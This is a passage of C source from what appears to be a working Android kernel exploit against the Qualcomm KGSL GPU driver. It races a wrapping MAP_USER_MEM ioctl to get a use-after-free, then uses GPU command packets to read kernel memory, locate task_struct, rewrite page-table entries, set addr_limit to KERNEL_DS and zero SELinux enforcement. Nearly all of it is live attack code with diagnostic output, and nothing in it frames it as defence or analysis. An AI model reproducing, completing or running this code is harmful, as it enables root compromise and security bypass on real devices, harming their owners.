                            snprintf(mks, sizeof(mks), "stage2 sig rcvd %d : %02x %02x %02x %02x %02x %02x %02x %02x",
                                     (int)svgot, svb[0], svb[1], svb[2], svb[3],
                                     svb[4], svb[5], svb[6], svb[7]);
                            mk(mks);
                        }
                        fprintf(stderr, "        [K] selinux_state=0x%016llx sig:",
                                (unsigned long long)selinux_state_addr);
                        for (int q = 0; q < 16; q++) fprintf(stderr, " %02x", svb[q]);
                        fprintf(stderr, "\n");
                        fflush(stderr);
                        mk("stage2 sig read done");
                        if (svgot >= 2 && svb[0] == 0x00 && svb[1] == 0x01) {
                            fprintf(stderr, "        [+++] kbase VALIDATED (enforcing=1)\n");
                        } else if (DIAG_LEAK_TARGET) {
                            fprintf(stderr, "        [DIAG] leak target mode; accepting sig leniently\n");
                            fflush(stderr);
                            mk("diag-leak-target done");
                            for (int si = 0; si < spray_count; si++) {
                                if (spray_ctrl[si].pid > 0)
                                    kill(spray_ctrl[si].pid, SIGKILL);
                            }
                            for (int si = 0; si < spray_count; si++) {
                                if (spray_ctrl[si].pid > 0)
                                    waitpid(spray_ctrl[si].pid, NULL, 0);
                            }
                            mk("diag-leak-target cleanup done");
                            _exit(0);
                        } else if (DIAG_WRITE_ONLY) {
                            fprintf(stderr, "        [DIAG] write-only mode; sig=%d exiting\n", (int)svgot);
                            fflush(stderr);
                            mk("diag-write-only done");
                            _exit(0);
                        } else if (DIAG_ZERO_ONLY) {
                            int64_t zres = *(int64_t *)&gbuf[LEAK_DONE];
                            fprintf(stderr, "        [DIAG] zero-only mode; z=%lld\n", (long long)zres);
                            fflush(stderr);
                            {
                                char mzr[96];
                                snprintf(mzr, sizeof(mzr), "diag-zero-only z=%lld", (long long)zres);
                                mk(mzr);
                            }
                            /* read the selinux enforce status as reported by the kernel */
                            {
                                char se[32] = {0};
                                int sefd = open("/sys/fs/selinux/enforce", O_RDONLY);
                                if (sefd >= 0) {
                                    ssize_t sn = read(sefd, se, sizeof(se) - 1);
                                    close(sefd);
                                    fprintf(stderr, "        [/sys/fs/selinux/enforce] '%s'\n", se);
                                    {
                                        char mse[64];
                                        snprintf(mse, sizeof(mse), "enforce_status '%s'", se);
                                        mk(mse);
                                    }
                                }
                            }
                            /* kill ALL children (SIGKILL: no die_handler) so the kgsl fd
                             * teardown on exit has no orphan mappings -> no teardown panic.
                             * No waitpid: reaping 8000 can hang on a D-state child. */
                            for (int si = 0; si < spray_count; si++) {
                                if (spray_ctrl[si].pid > 0)
                                    kill(spray_ctrl[si].pid, SIGKILL);
                            }
                            mk("diag-zero-only cleanup done");
                            fprintf(stderr, "        [DIAG] children killed; exiting\n");
                            fflush(stderr);
                            _exit(0);
                        } else {
                            fprintf(stderr, "        [K] !! kbase signature mismatch, rejecting\n");
                            fflush(stderr);
                            _exit(1);
                        }
                        fprintf(stderr, "        [K] selinux_state=0x%016llx enforcing=0x%016llx\n",
                                (unsigned long long)selinux_state_addr,
                                (unsigned long long)selinux_enforcing);
                        fflush(stderr);

                        /* trigger 2: leak pre-state, zero enforcing, leak post-state */
                        *(uint64_t *)&gbuf[LEAK_ADDR] = selinux_state_addr;
                        *(uint64_t *)&gbuf[LEAK_LEN]  = 0x10;
                        *(uint64_t *)&gbuf[SET_TASKS] = selinux_enforcing;
                        *(uint64_t *)&gbuf[POST_ADDR] = selinux_state_addr;
                        gbuf[0] = 0xab;
                        int trig2 = 0;
                        for (int si = 0; si < spray_count; si++) {
                            if (spray_ctrl[si].pid == comm_pid) {
                                spray_ctrl[si].do_action = 1;
                                trig2 = 1;
                                break;
                            }
                        }
                        if (!trig2) {
                            fprintf(stderr, "        [K] trigger2 failed\n");
                            fflush(stderr);
                            _exit(1);
                        }
                        uint8_t vbuf[0x40];
                        memset(vbuf, 0, sizeof(vbuf));
                        ssize_t vgot = 0;
                        {
                            struct pollfd pfd = { .fd = g_leaksock[0], .events = POLLIN };
                            for (int tries = 0; tries < 100 && vgot < 0x20; tries++) {
                                if (poll(&pfd, 1, 100) <= 0) continue;
                                ssize_t r = read(g_leaksock[0], vbuf + vgot, sizeof(vbuf) - vgot);
                                if (r <= 0) break;
                                vgot += r;
                            }
                        }
                        fprintf(stderr, "        [K] verify received %d bytes\n", (int)vgot);
                        mk("stage2 trigger2 read done");
                        if (vgot > 0) {
                            int pre = vgot > 0x10 ? 0x10 : vgot;
                            fprintf(stderr, "        [K] pre :");
                            for (int q = 0; q < pre; q++) fprintf(stderr, " %02x", vbuf[q]);
                            fprintf(stderr, "\n");
                            if (vgot > 0x10) {
                                fprintf(stderr, "        [K] post:");
                                for (int q = 0x10; q < (int)vgot; q++) fprintf(stderr, " %02x", vbuf[q]);
                                fprintf(stderr, "\n");
                                if (vbuf[1] == 0x01 && vbuf[0x11] == 0x00)
                                    fprintf(stderr, "        [+++] SELINUX ENFORCING ZEROED!\n");
                            }
                        }
                        fprintf(stderr, "        [K] child zero result (LEAK_DONE)=%lld\n",
                                (long long)*(int64_t *)&gbuf[LEAK_DONE]);
                        for (int si = 0; si < spray_count; si++) {
                            if (spray_ctrl[si].pid > 0)
                                kill(spray_ctrl[si].pid, SIGTERM);
                        }
                        for (int si = 0; si < spray_count; si++) {
                            if (spray_ctrl[si].pid > 0)
                                waitpid(spray_ctrl[si].pid, NULL, 0);
                        }
                        fflush(stderr);
                        _exit(0);
                        *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
                        int scc=0;
                        if (comm_pid >0 && spray_ctrl != NULL){
                            for (int si=0; si<spray_count;si++){
                                if (spray_ctrl[si].pid == comm_pid){
                                    fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);
                                    spray_ctrl[si].do_action=1;
                                    *(uint64_t *)&gbuf[TARGET_PIDPID] = spray_ctrl[si].pid;
                                    scc=1;

                                }
                            }
                        }
                        if (scc==0){
                            fprintf(stderr,"[!!] Something wrong!! no do_action. not Spray\n");
                            exit(1);
                        }
                    } else {
                        fprintf(stderr,
                                "        [!!!] addr_limit patch mismatch: read 0x%08X%08X expected 0x%08X%08X at VA 0x%llx (off 0x%03x)\n",
                                vdata[1], vdata[0],
                                kds_hi, kds_lo,
                                (unsigned long long)target_addr,
                                userds_off);
                        /* Retry once */
                        memset(ib_vma, 0, ib_alloc.mmapsize);
                        dw = 0;
                        wcmd = (uint32_t *)ib_vma;
                        for (int i = 0; i < 4; i++)
                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                        split64(target_addr, &t_lo, &t_hi);
                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                        wcmd[dw++] = t_lo;
                        wcmd[dw++] = t_hi;
                        wcmd[dw++] = kds_lo;
                        split64(target_addr + 4, &t_lo, &t_hi);
                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                        wcmd[dw++] = t_lo;
                        wcmd[dw++] = t_hi;
                        wcmd[dw++] = kds_hi;
                        for (int i = 0; i < 4; i++)
                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                        patch_ib_bytes = (size_t)dw * 4;
                        msync(ib_vma, patch_ib_bytes, MS_SYNC);
                        patch_obj.gpuaddr = ib_gpu;
                        patch_obj.size    = patch_ib_bytes;
                        patch_obj.id      = ib_id;
                        memset(&patch_cmd, 0, sizeof(patch_cmd));
                        patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
                        patch_cmd.cmdsize    = sizeof(patch_obj);
                        patch_cmd.numcmds    = 1;
                        patch_cmd.context_id = ctx_id;

                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
                            wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
                            /* Re-verify after retry */
                            memset(dst_vma, 0, dst_alloc.mmapsize);
                            memset(ib_vma, 0, ib_alloc.mmapsize);
                            dw = 0;
                            vcmd = (uint32_t *)ib_vma;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            split64(dst_gpu, &d_lo, &d_hi);
                            split64(target_addr, &s_lo, &s_hi);
                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                            vcmd[dw++] = 0;
                            vcmd[dw++] = d_lo;
                            vcmd[dw++] = d_hi;
                            vcmd[dw++] = s_lo;
                            vcmd[dw++] = s_hi;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            verify_ib_bytes = (size_t)dw * 4;
                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
                            verify_obj.gpuaddr = ib_gpu;
                            verify_obj.size    = verify_ib_bytes;
                            verify_obj.id      = ib_id;
                            memset(&verify_cmd, 0, sizeof(verify_cmd));
                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                            verify_cmd.cmdsize    = sizeof(verify_obj);
                            verify_cmd.numcmds    = 1;
                            verify_cmd.context_id = ctx_id;
                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
                                msync(dst_vma, dst_alloc.mmapsize,
                                      MS_SYNC | MS_INVALIDATE);
                            }
                            /* high dword */
                            memset(ib_vma, 0, ib_alloc.mmapsize);
                            dw = 0;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            split64(dst_gpu + 4, &d_lo, &d_hi);
                            split64(target_addr + 4, &s_lo, &s_hi);
                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                            vcmd[dw++] = 0;
                            vcmd[dw++] = d_lo;
                            vcmd[dw++] = d_hi;
                            vcmd[dw++] = s_lo;
                            vcmd[dw++] = s_hi;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            verify_ib_bytes = (size_t)dw * 4;
                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
                            verify_obj.gpuaddr = ib_gpu;
                            verify_obj.size    = verify_ib_bytes;
                            verify_obj.id      = ib_id;
                            memset(&verify_cmd, 0, sizeof(verify_cmd));
                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                            verify_cmd.cmdsize    = sizeof(verify_obj);
                            verify_cmd.numcmds    = 1;
                            verify_cmd.context_id = ctx_id;
                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
                                msync(dst_vma, dst_alloc.mmapsize,
                                      MS_SYNC | MS_INVALIDATE);
                            }

                            vdata = (uint32_t *)dst_vma;
                            fprintf(stderr,
                                    "        [*] Retry verify: %08X %08X\n",
                                    vdata[0], vdata[1]);
                            if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
                                fprintf(stderr,
                                        "        [+++] addr_limit KERNEL_DS confirmed after retry\n");
                                *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
                                if (comm_pid >0 && spray_ctrl != NULL){
                                    for (int si=0; si<spray_count;si++){
                                        if (spray_ctrl[si].pid == comm_pid){
                                            fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);

                                        }
                                    }
                                }
                            } else {
                                fprintf(stderr,
                                        "        [!!!] addr_limit patch still mismatched after retry: read 0x%08X%08X\n",
                                        vdata[1], vdata[0]);
                            }
                        }
                    }
                }   /* else: live spray child verified */
                }
                fflush(stderr);
            }

            if (only_once == 1) {
                if (non_zero_pages < FINDING) {
                    found_pages[non_zero_pages].va             = current_va;
                    found_pages[non_zero_pages].non_zero_count = non_zero;
                    memcpy(found_pages[non_zero_pages].data, data, 4096);
                }
                non_zero_pages = 1;
                fprintf(stderr,
                        "      [*] task_struct confirmed, stopping scan\n");
                fflush(stderr);
                found = 1;
                break;
            }
        }

        current_va += PAGE_SIZE;
    }

    fprintf(stderr, "\n    [*] Scan complete:\n");
    fprintf(stderr, "        Pages scanned: %d\n",   pages_scanned);
    fprintf(stderr, "        Pages : %d\n",
            non_zero_pages);
    fflush(stderr);

    if (only_once != 1) {
        fprintf(stderr,
                "    [!] only_once != 1 (task_struct not confirmed). Treating as failure.\n");
        fflush(stderr);
    }

    *num_found = non_zero_pages;
    found      = (only_once == 1);

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma  && ib_vma  != MAP_FAILED) munmap(ib_vma,  ib_alloc.mmapsize);

    if (dst_id) { struct kgsl_gpuobj_free fr = {0}; fr.id = dst_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (ib_id)  { struct kgsl_gpuobj_free fr = {0}; fr.id = ib_id;  ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }


    return found;
}


/* Analyze found pages  */
static void analyze_found_pages(struct nonzero_page *pages, int num_pages)
{
    fprintf(stderr, "\n[+] Analyzing %d pages for patterns\n", num_pages);
    fprintf(stderr, "========================================\n");
    fflush(stderr);

    uint64_t kernel_ds = (uint64_t)KERNEL_DS;      
    uint64_t user_ds   = (uint64_t)USER_DS;        

    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);

    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
    uint32_t uds_hi = (uint32_t)(user_ds >> 32);

    for (int p = 0; p < num_pages; p++) {
        fprintf(stderr, "\n[Page %d] VA 0x%llx, non-zero: %d/1024\n",
                p + 1,
                (unsigned long long)pages[p].va,
                pages[p].non_zero_count);

        uint32_t *data  = pages[p].data;
        uint8_t  *bytes = (uint8_t *)data;

        int comm_found  = 0;
        int comm_offset = -1;
        for (int offset = 0; offset < 4096 - 16; offset++) {
            if (memcmp(bytes + offset, "KETO0422", 8) == 0) {
                fprintf(stderr, "  [+] Found KETO0422 at offset 0x%03x\n", offset);
                fprintf(stderr, "      Comm: %.16s\n", bytes + offset);
                comm_found  = 1;
                comm_offset = offset;

                int cred_off = offset - 0x9C;
                if (cred_off >= 0 && cred_off < 4000) {
                    uint64_t cred = *(uint64_t *)(bytes + cred_off);
                    if ((cred & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                        fprintf(stderr,
                                "      Cred at 0x%03x: 0x%016llx\n",
                                cred_off, (unsigned long long)cred);
                        fprintf(stderr, "  [+++] CONFIRMED task_struct!\n");
                    }
                }
                break;
            }
        }

        fprintf(stderr, "\n  [*] Searching for FFFFFFC0 patterns:\n");
        int ffffffc0_count = 0;

        for (int i = 0; i < 1024; i++) {
            if ((data[i] & 0xFFFFFFF0) == 0xFFFFFFC0) {
                if (ffffffc0_count == 0) {
                    fprintf(stderr, "      Found FFFFFFC0 patterns at:\n");
                }

                if (ffffffc0_count < 10) {
                    fprintf(stderr, "        [0x%03x] %08X", i * 4, data[i]);

                    if (i > 0) {
                        uint64_t ptr = ((uint64_t)data[i] << 32) | data[i - 1];
                        fprintf(stderr, " (64-bit: 0x%016llx)",
                                (unsigned long long)ptr);
                    }
                    fprintf(stderr, "\n");
                }

                ffffffc0_count++;
            }
        }

        if (ffffffc0_count > 0) {
            fprintf(stderr, "      Total: %d FFFFFFC0 patterns\n", ffffffc0_count);
        } else {
            fprintf(stderr, "      No FFFFFFC0 patterns found\n");
        }

        fprintf(stderr,
                "\n  [*] Searching for USER_DS (0x%08X%08X):\n",
                uds_hi, uds_lo);
        int user_ds_found = 0;

        for (int i = 0; i < 1023; i++) {
            if (data[i] == uds_lo && data[i + 1] == uds_hi) {
                uint64_t val = ((uint64_t)uds_hi << 32) | uds_lo;
                fprintf(stderr,
                        "      [+] Found USER_DS at offset 0x%03x\n", i * 4);
                fprintf(stderr,
                        "          [0x%03x] %08X %08X\n",
                        i * 4, data[i], data[i + 1]);
                fprintf(stderr,
                        "          Value: 0x%016llx\n",
                        (unsigned long long)val);
                user_ds_found = 1;
            }
        }

        if (!user_ds_found) {
            fprintf(stderr, "      No USER_DS pattern found\n");
        }

        if (comm_found) {
            fprintf(stderr,
                    "\n  [*] Checking thread_struct area (0xf00-0xf80) for addr_limit:\n");
            int kds_pairs = 0;

            for (int off = 0xf00; off < 0xf80; off += 8) {
                int idx = off / 4;
                if (idx + 1 < 1024) {
                    if (data[idx] == kds_lo && data[idx + 1] == kds_hi) {
                        fprintf(stderr,
                                "      [0x%03x] %08X %08X (KERNEL_DS)\n",
                                off, data[idx], data[idx + 1]);
                        kds_pairs++;
                    }
                }
            }

            fprintf(stderr,
                    "      Found %d KERNEL_DS pairs in thread area\n",
                    kds_pairs);
        }

        /* 5. Dump thread_struct area (0xf00-0xf80) if comm found */
        if (comm_found) {
            fprintf(stderr, "\n  [*] Thread_struct area dump (0xf00-0xf80):\n");
            for (int off = 0xf00; off < 0xf80; off += 0x20) {
                int idx = off / 4;
                fprintf(stderr, "      [0x%03x]", off);
                for (int j = 0; j < 8 && (idx + j) < 1024; j++) {
                    fprintf(stderr, " %08X", data[idx + j]);
                }
                fprintf(stderr, "\n");
            }
        }

        fprintf(stderr, "\n");
        fflush(stderr);
    }

    fprintf(stderr, "========================================\n");
    fflush(stderr);
}


static int scan_uaf_and_collect(int fd,
				struct nonzero_page *pages,
				int *num_pages)
{
	unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
	uint64_t ib_gpu = 0, dst_gpu = 0;
	void *ib_vma = NULL, *dst_vma = NULL;
	int found = 0;

	*num_pages = 0;

	fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
	fprintf(stderr, "    Region: 0x%llx ~ 0x%llx\n",
		(unsigned long long)UAF_START,
		(unsigned long long)(UAF_START + UAF_SIZE));

	struct kgsl_drawctxt_create ctx = {
		.flags = 0x00000010 | 0x00000002 /* PREAMBLE | NO_GMEM_ALLOC */
	};
	if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
		fprintf(stderr, "    [!] Failed to create GPU context\n");
		return 0;
	}
	ctx_id = ctx.drawctxt_id;

	struct kgsl_gpuobj_alloc ib_alloc = {
		.size  = PAGE_SIZE * 8,
		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
	};
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
		exit(1);

	ib_id = ib_alloc.id;
	ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
		      MAP_SHARED, fd, ((off_t)ib_id) << 12);
	if (ib_vma == MAP_FAILED)
		exit(1);

	struct kgsl_gpuobj_info info = { .id = ib_id };
	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
	ib_gpu = info.gpuaddr;

	struct kgsl_gpuobj_alloc dst_alloc = {
		.size  = PAGE_SIZE,
		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
	};
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
		exit(1);

	dst_id = dst_alloc.id;
	dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
		       MAP_SHARED, fd, ((off_t)dst_id) << 12);
	if (dst_vma == MAP_FAILED)
		exit(1);

	info.id = dst_id;
	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
	dst_gpu = info.gpuaddr;

	fprintf(stderr, "    [+] IB GPU=0x%llx, DST GPU=0x%llx\n",
		(unsigned long long)ib_gpu, (unsigned long long)dst_gpu);
	fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");

	uint64_t start_va   = UAF_START ;
	uint64_t end_va     = UAF_START + UAF_SIZE;
	uint64_t current_va = start_va;
	int pages_scanned   = 0;
	uint32_t *rb_count  = (uint32_t *)(gbuf + 0xb00);

	while (current_va < end_va && *rb_count < MAX_FOUND_PAGES) {
		uint32_t *cmd = (uint32_t *)ib_vma;
		memset(ib_vma, 0, ib_alloc.mmapsize);
		memset(dst_vma, 0, dst_alloc.mmapsize);
		int dw = 0;

		cmd[dw++] = cp_type7_packet(CP_NOP, 0);

		for (int i = 0; i < 1024; i++) {
			uint32_t d_lo, d_hi, s_lo, s_hi;
			split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
			split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

			cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
			cmd[dw++] = 0;
			cmd[dw++] = d_lo;
			cmd[dw++] = d_hi;
			cmd[dw++] = s_lo;
			cmd[dw++] = s_hi;
		}

		cmd[dw++] = cp_type7_packet(CP_NOP, 0);

		size_t ib_bytes = (size_t)dw * 4;
		msync(ib_vma, ib_bytes, MS_SYNC);

		struct kgsl_command_object cmd_obj = {
			.gpuaddr = ib_gpu,
			.size    = ib_bytes,
			.flags   = 0x1,
			.id      = ib_id
		};

		struct kgsl_gpu_command gpu_cmd = {0};
		gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
		gpu_cmd.cmdsize    = sizeof(cmd_obj);
		gpu_cmd.numcmds    = 1;
		gpu_cmd.context_id = ctx_id;

		if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
			break;
		if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
			break;

		msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

		uint32_t *data = (uint32_t *)dst_vma;
		int non_zero = 0;
		int page_f53 = 0;
		for (int i = 0; i < 1024; i++) {
			if (data[i] != 0)
				non_zero++;
			if ((data[i] & 0xFFF) == 0xF53)
				page_f53++;
		}
		if (page_f53 > 0) {
			g_f53_count++;
			if (g_f53_count <= 3) {
				char mf[128];
				snprintf(mf, sizeof(mf),
					 "phase1scan f53 page=%d nz=%d f53=%d head=%08x %08x %08x %08x",
					 pages_scanned, non_zero, page_f53,
					 data[0], data[1], data[2], data[3]);
				mk(mf);
			}
			/* dense F53 page (many PTE entries) => potential kernel page table.
			 * Lower threshold to catch sparse-but-real PTE pages. */
			if (g_kern_pte_page == 0 && page_f53 > 5) {
				g_kern_pte_page = current_va;
				{
					char mkp[192];
					snprintf(mkp, sizeof(mkp),
						 "phase1scan kernpte va=0x%llx nz=%d f53=%d e0=%016llx e1=%016llx e2=%016llx e3=%016llx",
						 (unsigned long long)current_va, non_zero, page_f53,
						 (unsigned long long)(((uint64_t)data[1] << 32) | data[0]),
						 (unsigned long long)(((uint64_t)data[3] << 32) | data[2]),
						 (unsigned long long)(((uint64_t)data[5] << 32) | data[4]),
						 (unsigned long long)(((uint64_t)data[7] << 32) | data[6]));
					mk(mkp);
				}
			}
		}

		pages_scanned++;
		if (pages_scanned % 100 == 0) {
			fprintf(stderr, ".");
			fflush(stderr);
		}   

		if (non_zero >= 8 && non_zero <= 20) {
            fprintf(stderr,"nz ~10\n");
			if (non_zero >= 8 && non_zero <= 20 &&
			    data[2] && data[3] && data[6] && data[7] && data[10] && data[11] && data[14] && data[15] && data[18] && data[19] ) {
				const uint32_t f53_mask = 0xFFF;
				const uint32_t f53_tag  = 0xF53;
				if (((data[2] & f53_mask) == f53_tag) &&
				    ((data[6] & f53_mask) == f53_tag)) {
                    fprintf(stderr, "vic_pte %x %x",data[2],data[3]);
					memset(ib_vma, 0, ib_alloc.mmapsize);
					int wdw = 0;
					uint32_t *wcmd = (uint32_t *)ib_vma;

					for (int i = 0; i < 4; i++)
						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);

					uint32_t t_lo, t_hi;

					/* one-shot write: set the 5 sig-page PTE slots to map up to 5 candidate
					 * kernel phys (512MB apart from the base cand) in ONE GPU command.
					 * Without a candidate, keep the user double-mapping. */
					uint64_t base_pte = ((uint64_t)data[7] << 32) | data[6];
					uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
					uint64_t cands[5];
					int ncand = 0;
					if (g_kern_cand_phys) {
						for (int j = 0; j < 5; j++)
							cands[ncand++] = g_kern_cand_phys + 0x2000000ULL * (uint64_t)j;
					}
					for (int j = 0; j < 5; j++) {
						uint64_t wp = base_pte;
						if (ncand)
							wp = (base_pte & ~PFN_MASK & ~0x3CULL & ~0x80ULL & ~0x300ULL) |
							     (cands[j] & PFN_MASK) |
							     ((uint64_t)g_pte_attrindex << 2) |
							     0x300ULL;
						split64(current_va + 8 * sig_num[j], &t_lo, &t_hi);
						wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
						wcmd[wdw++] = t_lo;
						wcmd[wdw++] = t_hi;
						wcmd[wdw++] = (uint32_t)(wp & 0xffffffffu);
						split64(current_va + 4 + 8 * sig_num[j], &t_lo, &t_hi);
						wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
						wcmd[wdw++] = t_lo;
						wcmd[wdw++] = t_hi;
						wcmd[wdw++] = (uint32_t)(wp >> 32);
					}

					for (int i = 0; i < 4; i++)
						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);

					if (*rb_count < MAX_FOUND_PAGES) {
						uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
						*(uint64_t *)slot = current_va;
                        fprintf(stderr,
                                "cur_VA : %llx\n",
                                (unsigned long long)*(uint64_t *)slot);
						uint32_t *slot_dw = (uint32_t *)(slot + 8); //b10
						slot_dw[0] = data[2]; //b10
						slot_dw[1] = data[3]; //b14
						slot_dw[2] = data[6]; //b18
						slot_dw[3] = data[7]; //b1c
						uint64_t *save_pte0 = (uint64_t *)(gbuf + PTE_SAVE_BASE + (*rb_count) * 8);
						*save_pte0 = ((uint64_t)data[3] << 32) | data[2];
						(*rb_count)++;
					}


					size_t patch_ib_bytes = (size_t)wdw * 4;
					msync(ib_vma, patch_ib_bytes, MS_SYNC);

					struct kgsl_command_object patch_obj = {
						.gpuaddr = ib_gpu,
						.size    = patch_ib_bytes,
						.flags   = KGSL_CMDLIST_IB,
						.id      = ib_id
					};

					struct kgsl_gpu_command patch_cmd = {0};
					patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
					patch_cmd.cmdsize    = sizeof(patch_obj);
					patch_cmd.numcmds    = 1;
					patch_cmd.context_id = ctx_id;

					if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
					    wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
						fprintf(stderr,
							"      [*] CP_MEM_WRITE: mirrored PTE 0x8 -> 0x0 on VA 0x%llx (F53 suffix)\n",
							(unsigned long long)current_va);
					} else {
						fprintf(stderr,
							"      [!] CP_MEM_WRITE failed while mirroring PTE on VA 0x%llx\n",
							(unsigned long long)current_va);
					}
					/* NOTE: the mirror above is the ONE-SHOT PTE write. A second write
					 * to the same slot hangs the GPU (watchdog), so no re-patch here. */
				} else {
					fprintf(stderr,
						"      [!] Skipping CP_MEM_WRITE: PTE low dword does not end with 0xF53\n");
				}
			}

			if (*num_pages < MAX_FOUND_PAGES) {
				struct nonzero_page *p = &pages[*num_pages];
				p->va = current_va;
				p->non_zero_count = non_zero;
				memcpy(p->data, data, sizeof(p->data));
				(*num_pages)++;
			}

			fprintf(stderr,
				"\n\n    [!] Found page with == 10 non-zero dwords @ VA 0x%llx (%d/1024)\n",
				(unsigned long long)current_va, non_zero);
		}

		current_va += PAGE_SIZE;
	}

	fprintf(stderr, "\n\n    [*] Scan done: scanned %d pages, collected %d pages\n",
		pages_scanned, *num_pages);
	found = *num_pages > 0;

cleanup:
    usleep(1000000);
	if (dst_id) {
		struct kgsl_gpuobj_free fr = {0};
		fr.id = dst_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (ib_id) {
		struct kgsl_gpuobj_free fr = {0};
		fr.id = ib_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (dst_vma && dst_vma != MAP_FAILED)
		munmap(dst_vma, dst_alloc.mmapsize);

	if (ib_vma && ib_vma != MAP_FAILED)
		munmap(ib_vma, ib_alloc.mmapsize);

	return found;
}

static void dump_nonzero_pages(struct nonzero_page *pages, int num_pages)
{
    fprintf(stderr, "\n[+] Dumping %d non-zero pages\n\n", num_pages);
    fflush(stderr);
    
    for (int p = 0; p < num_pages; p++) {
        fprintf(stderr, "========================================\n");
        fprintf(stderr, "Page %d: VA 0x%llx (%d non-zero dwords)\n",
                p + 1,
                (unsigned long long)pages[p].va,
                pages[p].non_zero_count);
        fprintf(stderr, "========================================\n");
        
        for (int i = 0; i < 1024; i++) {
            if (i % 8 == 0) {
                fprintf(stderr, "[0x%03x] ", i * 4);
            }
            
            fprintf(stderr, "%08X ", pages[p].data[i]);
            
            if (i % 8 == 7) {
                fprintf(stderr, "\n");
            }
        }
        
        fprintf(stderr, "\n");
        fflush(stderr);
    }
    
    analyze_found_pages(pages, num_pages);
}













static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, 
                                void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;
    void *p = mmap(fixed_addr, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
    return p;
}

static void *bogus_racer(void *arg)
{
    race_state_t *rs = (race_state_t *)arg;
    
    while (!rs->ready) {
        __asm__ __volatile__("" ::: "memory");
    }
    
    rs->bogus_started = 1;
    __sync_synchronize();
    
    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.gpuaddr = 0;
    req.len = WRAP_SIZE;                      // Wraps around!
    req.offset = 0;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;   
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    
    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    int err = errno;
    
    rs->result = ret;
    rs->saved_errno = err;
    __sync_synchronize();
    
    return NULL;
}

